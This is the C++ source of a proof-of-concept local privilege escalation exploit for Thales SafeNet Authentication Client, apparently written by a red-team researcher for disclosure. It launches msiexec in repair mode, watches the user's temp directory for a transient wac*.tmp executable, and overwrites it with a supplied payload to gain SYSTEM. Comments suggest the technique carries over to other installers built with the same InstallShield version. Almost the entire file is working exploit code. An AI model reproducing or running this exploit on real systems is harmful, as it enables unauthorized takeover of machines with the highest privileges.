#include <windows.h>
#include <winbase.h>
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include <strsafe.h>
#include <pathcch.h>
#include <Shlwapi.h>
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Shlwapi.lib") 
#include "stdafx.h"

// This is Thales SafeNet Authentication Client msiexec repair mode race condition LPE exploit.
// Developed by Julian Horoszkiewicz (Eviden Red Team), December 2023

void init_variables();
void init_files();
void watch_and_exploit(LPTSTR);
void load_payload();
void start_msiexec();

size_t EXE_BUFF_LENGTH = 0;
char* EXE_BUFFER;
int FAIL_COUNT = 0; // file overwrite fail count
int MAX_FAILS = 50; // file overwrite max failures count
int MAX_SCAN_FAIL_COUNT = 300; // this is for scanning for wac*.tmp files
int WAIT_FOR_POC_APPEARANCE_SECONDS = 35; // how to long to sleep before chekcking if poc.txt was created in C:\Users\Public (this is cosmetic and our raw.exe-specific only)
int SCAN_FAIL_COUNT = 0;

// SCAN_SLEEP_MILISECONDS variable comment: Initially there was no sleep between FindFirstFile() calls (scanning the directory for the appearance of the dynamically generated wacXXXX.tmp file - a copy of ISBEW64.exe (MD5 9f9c3f526ee03b257b7447d4305b9c73)),
// however - something I find interesting on its own - when this program kept aggressively scanning for it in a loop without any delays, to make sure not to lose the race condition, it kept msiexec.exe from
// writing that file indefinitely, and eventually I figured out that there is a very long time window between time of creation and time of use of the file (about 26 seconds!), and making this exploit less aggressive
// will actually improve its accuracy instead of degrarding it. Tune this down or up if your exploit keeps failing. It is by default set to one second which should work just fine.
// It seems to me this exploit should also work against any other installer built with this version of Flexera Installshield.
int SCAN_SLEEP_MILISECONDS = 1000; 

WIN32_FIND_DATA ffd;
HANDLE hFind = INVALID_HANDLE_VALUE;
TCHAR SAFENET_MSI_FILE[MAX_PATH];
TCHAR LOCALAPPDATA[MAX_PATH]; // C:\Users\win10\AppData\ 
TCHAR FLEXERA_TEMP_TARGET_EXE[MAX_PATH]; // C:\Users\win10\AppData\Local\Temp\wacXXXX.tmp (XXXX is not known prior to exploitation, we have to catch it dynamically)
TCHAR FLEXERA_TEMP_DIRMASK[MAX_PATH];
TCHAR MSIEXEC_COMMAND_LINE[MAX_PATH];
TCHAR CURRENT_DIR[MAX_PATH];
TCHAR PAYLOAD_EXE_PATH[MAX_PATH]; // CURRENT_DIR+ "\\raw.exe"
TCHAR POC_PATH[MAX_PATH];
DWORD dwError = 0;
DWORD bytesRead;
size_t path_len = 0;

void init_variables()	// READY
{    
    GetModuleFileName(NULL, CURRENT_DIR, MAX_PATH);
    StringCchLength(CURRENT_DIR, MAX_PATH, &path_len);
    PathCchRemoveFileSpec(CURRENT_DIR, path_len);
    StringCchCopy(PAYLOAD_EXE_PATH, MAX_PATH, CURRENT_DIR);
    StringCchCat(PAYLOAD_EXE_PATH, MAX_PATH, TEXT("\\raw.exe")); // the exe must be compiled separately and provided with this POC; target: wacXXXX.tmp

    GetEnvironmentVariable(TEXT("TEMP"), LOCALAPPDATA, MAX_PATH); // C:\Users\user\AppData\Local is what we're looking for  

    StringCchCat(POC_PATH, MAX_PATH,TEXT("C:\\Users\\Public\\poc.txt"));

    StringCchCopy(FLEXERA_TEMP_DIRMASK, MAX_PATH, LOCALAPPDATA);
    StringCchCat(FLEXERA_TEMP_DIRMASK, MAX_PATH, TEXT("\\wac*"));
    load_payload(); // read the exe into memory
}

void init_files() // LOOKS GOOD
{
    _tprintf(TEXT("Running backup and cleanup [PID: %d] ...\n"), GetCurrentProcessId());
    if (PathFileExists(POC_PATH))
    {
        _tprintf(TEXT("Detected old %s, removing.\n"), POC_PATH);
        DeleteFile(POC_PATH);
    }
    _tprintf(TEXT("Checking for old leftovers...\n"));    
    hFind = FindFirstFile(FLEXERA_TEMP_DIRMASK, &ffd);
    if (INVALID_HANDLE_VALUE == hFind) // I think this might happen if we get a notification caused by a third-party interference (other directory created, with a different prefix) - take this into account in error handling
    {
        _tprintf(TEXT("No leftovers from previous installations found (good).\n"));
        return; // no leftovers from previous installations found
    }
    do
    {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_NORMAL) // we found our candidate
        {
            StringCchCopy(FLEXERA_TEMP_TARGET_EXE, MAX_PATH, LOCALAPPDATA);
            StringCchCat(FLEXERA_TEMP_TARGET_EXE, MAX_PATH, TEXT("\\"));
            StringCchCat(FLEXERA_TEMP_TARGET_EXE, MAX_PATH, ffd.cFileName); // build the full path from scratch
            _tprintf(TEXT("Removing old file %s...\n"), FLEXERA_TEMP_TARGET_EXE);
            DeleteFile(FLEXERA_TEMP_TARGET_EXE);
            //  if directory does not exist, create it, if executable exists, remove it
        }
    } while(FindNextFile(hFind, &ffd) != 0);
    _tprintf(TEXT("Cleanup routine done.\n"));
}

void load_payload()
{
    // READ THE raw.exe file into memory
    HANDLE fileHandle = CreateFile(PAYLOAD_EXE_PATH, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("\nFatal: failed to open %s EXE file for reading!"), PAYLOAD_EXE_PATH);
        ExitProcess(1);
    }
    // Get the file size
    EXE_BUFF_LENGTH = GetFileSize(fileHandle, NULL);
    EXE_BUFFER = new char[EXE_BUFF_LENGTH];
    
    if (!ReadFile(fileHandle, EXE_BUFFER, EXE_BUFF_LENGTH, &bytesRead, NULL)) {
        _tprintf(TEXT("\nFailed to read the %s EXE file!"), PAYLOAD_EXE_PATH);
        delete[] EXE_BUFFER;
        CloseHandle(fileHandle);
        ExitProcess(1);
    }
}
void start_msiexec()
{
    StringCchCopy(MSIEXEC_COMMAND_LINE, MAX_PATH, TEXT("msiexec.exe /fa "));
    StringCchCat(MSIEXEC_COMMAND_LINE, MAX_PATH, SAFENET_MSI_FILE);
    _tprintf(TEXT("Starting %s...\n"), MSIEXEC_COMMAND_LINE);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Start the child process. 
    if (!CreateProcess(NULL,   // No module name (use command line)
        MSIEXEC_COMMAND_LINE,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf("CreateProcess failed (%d). Exiting!\n", GetLastError());
        ExitProcess(1);
    }

    _tprintf(TEXT("Done...\n"));
}

void deploy_payload(LPTSTR target_filename) // second version, let's try writing into it, hopefully this will be faster than trying to replace the file instead...
{
    _tprintf(TEXT("Deploying %s ..."), target_filename);
    FAIL_COUNT = 0;
    while (FAIL_COUNT < MAX_FAILS)
    {
        HANDLE outFile = CreateFile(target_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (outFile == INVALID_HANDLE_VALUE)
        {
            FAIL_COUNT++;
            _tprintf(TEXT("\nFailed to overwrite the %s file (%d attempt)!"), target_filename, FAIL_COUNT);
            continue;
        }
        // Write binary data to the file
        DWORD bytesWritten;
        if (!WriteFile(outFile, EXE_BUFFER, EXE_BUFF_LENGTH, &bytesWritten, NULL))
        {
            _tprintf(TEXT("\nFailed to write into %s file!"), target_filename);
        }
        else
        {
            CloseHandle(outFile);
            printf("\nFile overwritten (%d bytes written)! Hopefully at the right moment!\nSleeping for %d seconds...\n", bytesWritten, WAIT_FOR_POC_APPEARANCE_SECONDS);
            // we could add a routine checking for C:\Users\Public\poc.txt here
            Sleep(WAIT_FOR_POC_APPEARANCE_SECONDS*1000);
            if (PathFileExists(POC_PATH))
            {
                printf("\n\nGOT SYSTEM BABY!!! C:\\Users\\Public\\poc.txt was created!\n\n");
            }
            else
            {
                printf("We must have won the condition too early! Wait until installer finishes and try again!\n");
            }
            ExitProcess(0); // exit all threads, we're done here - if we failed to get SYSTEM after first overwrite, we have failed and there is no reason to try again
        }
    }
}
void deploy_payload_overlay()
{
    StringCchCopy(FLEXERA_TEMP_TARGET_EXE, MAX_PATH, LOCALAPPDATA);
    StringCchCat(FLEXERA_TEMP_TARGET_EXE, MAX_PATH, TEXT("\\"));
    StringCchCat(FLEXERA_TEMP_TARGET_EXE, MAX_PATH, ffd.cFileName); // build the full path from scratch
    _tprintf(TEXT("Discovered file named %s, trying to overwrite...\n"), FLEXERA_TEMP_TARGET_EXE);
    deploy_payload(FLEXERA_TEMP_TARGET_EXE);
}
void watch_and_exploit(LPTSTR target_dir)
{
    DWORD dwWaitStatus;
    HANDLE dwChangeHandle;
    dwChangeHandle = FindFirstChangeNotificationW(target_dir, FALSE, FILE_NOTIFY_CHANGE_FILE_NAME); // watch file name changes
    if (dwChangeHandle == INVALID_HANDLE_VALUE)
    {
        _tprintf(TEXT("\n ERROR: FindFirstChangeNotification function failed.\n"));
        ExitProcess(GetLastError());
    }
    if (dwChangeHandle == NULL)
    {
        _tprintf(TEXT("\n ERROR: Unexpected NULL from FindFirstChangeNotification.\n"));
        ExitProcess(GetLastError());
    }
    _tprintf(TEXT("\nDirectory being watched for changes: %s\n"), target_dir);
    start_msiexec(); // STARTING MSIEXEC PROCESS
    dwWaitStatus = WaitForSingleObject(dwChangeHandle, INFINITE);
    _tprintf(TEXT("Got first change notification, starting to scan for wac*.tmp files...\n"));
    _tprintf(TEXT("\nChecking for %s...\n"), FLEXERA_TEMP_DIRMASK);
    while(SCAN_FAIL_COUNT < MAX_SCAN_FAIL_COUNT)
    {
        hFind = FindFirstFile(FLEXERA_TEMP_DIRMASK, &ffd);                
        if (INVALID_HANDLE_VALUE == hFind) // I think this might happen if we get a notification caused by a third-party interference (other directory created, with a different prefix) - take this into account in error handling
        {
            SCAN_FAIL_COUNT++;
            Sleep(SCAN_SLEEP_MILISECONDS); // sleep for a bit to make the scan less aggressive, as it prevents the installer from writing into the directory (which is interesting, btw)
            _tprintf(TEXT("INVALID_HANDLE received from FindFirstNotification, ignoring for the %d time...\n"), SCAN_FAIL_COUNT); // 
            continue;
        }
        // if we got here, we found our target
        deploy_payload_overlay();         
        while (FindNextFile(hFind, &ffd)) // if more files are present - which should not be the case - overwrite them as well
        {
             deploy_payload_overlay();
        }
        return;
    }
    _tprintf(TEXT("Exceeded the maximum number of failed attempts at detecting %s, exiting.\n"), FLEXERA_TEMP_DIRMASK);
}
int _tmain(int argc, TCHAR *argv[])
{
    if (argc != 2)
    {
        _tprintf(TEXT("\nUsage: %s PATH_TO_DRIVER_INSTALLER.msi\n\n"), argv[0]);
        ExitProcess(1);
    }
    if (!PathFileExists(argv[1])) // check if the provided file exists
    {
        _tprintf(TEXT("\nFatal: provided %s MSI file does not exist!\n\n"), argv[1]);
        ExitProcess(1);
    }
    StringCchCopy(SAFENET_MSI_FILE, MAX_PATH, argv[1]);
    
    init_variables(); // initate paths
    init_files(); // if directory does not exist, create it, if executable exists, remove it
    watch_and_exploit(LOCALAPPDATA);
}

